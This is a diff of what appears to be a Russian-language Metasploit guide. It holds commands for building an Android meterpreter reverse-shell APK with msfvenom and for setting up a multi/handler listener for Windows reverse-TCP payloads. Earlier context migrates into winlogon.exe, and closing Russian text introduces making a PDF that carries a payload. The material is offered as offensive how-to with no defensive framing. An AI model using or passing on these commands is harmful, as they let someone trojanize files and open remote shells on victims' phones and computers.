@@ -24,20 +24,20 @@ migrate -N winlogon.exe
 run
 
 
-
-Для АНДРОИД
-msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk
-
 use exploit/mulit/handler
 
 set payload windows/meterpreter/reverse_tcp
 set PAYLOAD windows/x64/shell_reverse_tcp
+
 set lhost 192.168.0.9
 
 set lport 4444
 
 exploit
 
+
+Для АНДРОИД
+msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk
 
 Эксплоит в PDF​
 Так же для фреймворка не составит труда сгенерировать PDF файл с полезной нагрузкой и аналогичным образом подключиться к нему. Давайте же приступим!
